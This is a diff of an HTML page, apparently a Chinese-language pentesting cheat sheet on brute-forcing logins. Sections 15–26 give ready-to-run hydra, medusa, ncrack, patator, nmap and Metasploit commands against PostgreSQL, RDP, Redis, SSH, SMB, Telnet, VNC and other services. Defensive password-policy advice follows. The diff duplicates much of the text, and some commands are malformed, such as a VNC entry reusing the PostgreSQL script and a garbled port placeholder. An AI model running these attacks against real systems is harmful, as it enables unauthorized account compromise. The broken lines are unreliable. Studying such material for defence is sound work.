-<h3 id="25-Telnet"><a href="#25-Telnet" class="headerlink" title="25. Telnet"></a>25. Telnet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet</span><br><span class="line">ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet</span><br></pre></td></tr></table></figure>
+<h3 id="15-PostgreSQL"><a href="#15-PostgreSQL" class="headerlink" title="15. PostgreSQL"></a>15. PostgreSQL</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt; postgres
+medusa -h &lt;IP&gt; –U &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt –M postgres
+ncrack –v –U &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt;:5432
+patator pgsql_login host&#x3D;&lt;IP&gt; user&#x3D;FILE0 0&#x3D;&#x2F;root&#x2F;Desktop&#x2F;user.txt password&#x3D;FILE1 1&#x3D;&#x2F;root&#x2F;Desktop&#x2F;pass.txt
+use auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login
+nmap -sV --script pgsql-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 5432 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="26-VNC"><a href="#26-VNC" class="headerlink" title="26. VNC"></a>26. VNC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc</span><br><span class="line">medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc</span><br><span class="line">ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T</span><br><span class="line">patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=&#x27;Authentication failure&#x27; --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">#Metasploit</span><br><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">set RHOSTS &lt;ip&gt;</span><br><span class="line">set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst</span><br></pre></td></tr></table></figure>
+<h3 id="16-RDP"><a href="#16-RDP" class="headerlink" title="16. RDP"></a>16. RDP</h3><pre class="line-numbers language-none"><code class="language-none">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp:&#x2F;&#x2F;&lt;IP&gt;
+hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp:&#x2F;&#x2F;&lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="0x04-防御加固"><a href="#0x04-防御加固" class="headerlink" title="0x04 防御加固"></a>0x04 防御加固</h2><h3 id="1-缺陷总结"><a href="#1-缺陷总结" class="headerlink" title="1. 缺陷总结"></a>1. 缺陷总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(1) 公共弱口令，出现频率比较高的弱口令</span><br><span class="line"></span><br><span class="line">(2) 数字或字母连排或混排，键盘字母连排</span><br><span class="line"></span><br><span class="line">(3) 默认密码，网络设备、系统组件等默认初始化弱口令</span><br><span class="line"></span><br><span class="line">(4) 生日，姓名+生日（利用社工非常容易被破解）</span><br><span class="line"></span><br><span class="line">(5) 短语密码（如：5201314，love1314等）</span><br></pre></td></tr></table></figure>
+<h3 id="17-Redis"><a href="#17-Redis" class="headerlink" title="17. Redis"></a>17. Redis</h3><pre class="line-numbers language-none"><code class="language-none">msf&gt; use auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_login
+nmap --script redis-brute -p 6379 &lt;IP&gt;
+hydra –P &#x2F;path&#x2F;pass.txt redis:&#x2F;&#x2F;&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-口令设置"><a href="#2-口令设置" class="headerlink" title="2. 口令设置"></a>2. 口令设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令</span><br><span class="line"></span><br><span class="line">（2）口令长度不小于8 个字符</span><br><span class="line"></span><br><span class="line">（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）</span><br><span class="line"></span><br><span class="line">（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符</span><br><span class="line"></span><br><span class="line">（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词</span><br><span class="line"></span><br><span class="line">（6）口令不应该为用数字或符号代替某些字母的单词</span><br><span class="line"></span><br><span class="line">（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入</span><br><span class="line"></span><br><span class="line">（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="18-Rexec"><a href="#18-Rexec" class="headerlink" title="18. Rexec"></a>18. Rexec</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec:&#x2F;&#x2F;&lt;Victim-IP&gt; -v -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3. 防御策略"></a>3. 防御策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(1) 少用滚键盘类的密码，尽量使用难以猜解的密码</span><br><span class="line"></span><br><span class="line">(2) 防止信息泄漏导致密码泄漏或者可能易于被猜测: 登录名和用户名应进行区分；实行有效的密码策略，杜绝密码中包含用户名；不要使用易于从企业名称或者域名中得到密码信息的口令；防止GitHub信息泄漏</span><br><span class="line"></span><br><span class="line">(3) 禁止大量系统使用同一密码</span><br><span class="line"></span><br><span class="line">(4) 不要使用默认密码，密码默认即为密码公开</span><br><span class="line"></span><br><span class="line">(5) 撞库问题防范: 应定期修改密码，不同的网站或账户不应该使用相同的密码; 对登录进行有效验证限制、各个功能接口做检验</span><br></pre></td></tr></table></figure>
+<h3 id="19-Rlogin"><a href="#19-Rlogin" class="headerlink" title="19. Rlogin"></a>19. Rlogin</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin:&#x2F;&#x2F;&lt;Victim-IP&gt; -v -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="20-Rsh"><a href="#20-Rsh" class="headerlink" title="20. Rsh"></a>20. Rsh</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &lt;Username_list&gt; rsh:&#x2F;&#x2F;&lt;Victim_IP&gt; -v -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="21-Rsync"><a href="#21-Rsync" class="headerlink" title="21. Rsync"></a>21. Rsync</h3><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script rsync-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 873 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="22-SMB"><a href="#22-SMB" class="headerlink" title="22. SMB"></a>22. SMB</h3><pre class="line-numbers language-none"><code class="language-none">nmap --script smb-brute -p 445 &lt;IP&gt;
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="23-Socks"><a href="#23-Socks" class="headerlink" title="23. Socks"></a>23. Socks</h3><pre class="line-numbers language-none"><code class="language-none">nmap  -vvv -sCV --script socks-brute --script-args userdb&#x3D;users.txt,passdb&#x3D;&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit&#x3D;30m -p 1080 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="24-SSH"><a href="#24-SSH" class="headerlink" title="24. SSH"></a>24. SSH</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
+ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
+patator ssh_login host&#x3D;&lt;ip&gt; port&#x3D;22 user&#x3D;root 0&#x3D;&#x2F;path&#x2F;passwords.txt password&#x3D;FILE0 -x ignore:mesg&#x3D;&#39;Authentication failed&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="25-Telnet"><a href="#25-Telnet" class="headerlink" title="25. Telnet"></a>25. Telnet</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
+ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="26-VNC"><a href="#26-VNC" class="headerlink" title="26. VNC"></a>26. VNC</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+medusa -h &lt;IP&gt; –u root -P &#x2F;root&#x2F;Desktop&#x2F;pass.txt –M vnc
+ncrack -V --user root -P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt;:&gt;POR&gt;T
+patator vnc_login host&#x3D;&lt;IP&gt; password&#x3D;FILE0 0&#x3D;&#x2F;root&#x2F;Desktop&#x2F;pass.txt –t 1 –x retry:fgep!&#x3D;&#39;Authentication failure&#39; --max-retries 0 –x quit:code&#x3D;0use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login
+nmap -sV --script pgsql-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 5432 &lt;IP&gt;
+
+#Metasploit
+use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login
+set RHOSTS &lt;ip&gt;
+set PASS_FILE &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;passwords.lst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x04-防御加固"><a href="#0x04-防御加固" class="headerlink" title="0x04 防御加固"></a>0x04 防御加固</h2><h3 id="1-缺陷总结"><a href="#1-缺陷总结" class="headerlink" title="1. 缺陷总结"></a>1. 缺陷总结</h3><pre class="line-numbers language-none"><code class="language-none">(1) 公共弱口令，出现频率比较高的弱口令
+
+(2) 数字或字母连排或混排，键盘字母连排
+
+(3) 默认密码，网络设备、系统组件等默认初始化弱口令
+
+(4) 生日，姓名+生日（利用社工非常容易被破解）
+
+(5) 短语密码（如：5201314，love1314等）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-口令设置"><a href="#2-口令设置" class="headerlink" title="2. 口令设置"></a>2. 口令设置</h3><pre class="line-numbers language-none"><code class="language-none">
+（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令
+
+（2）口令长度不小于8 个字符
+
+（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）
+
+（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符
+
+（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词
+
+（6）口令不应该为用数字或符号代替某些字母的单词
+
+（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入
+
+（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令\
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3. 防御策略"></a>3. 防御策略</h3><pre class="line-numbers language-none"><code class="language-none">(1) 少用滚键盘类的密码，尽量使用难以猜解的密码
+
+(2) 防止信息泄漏导致密码泄漏或者可能易于被猜测: 登录名和用户名应进行区分；实行有效的密码策略，杜绝密码中包含用户名；不要使用易于从企业名称或者域名中得到密码信息的口令；防止GitHub信息泄漏
+
+(3) 禁止大量系统使用同一密码
+
+(4) 不要使用默认密码，密码默认即为密码公开
+
+(5) 撞库问题防范: 应定期修改密码，不同的网站或账户不应该使用相同的密码; 对登录进行有效验证限制、各个功能接口做检验<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></p>
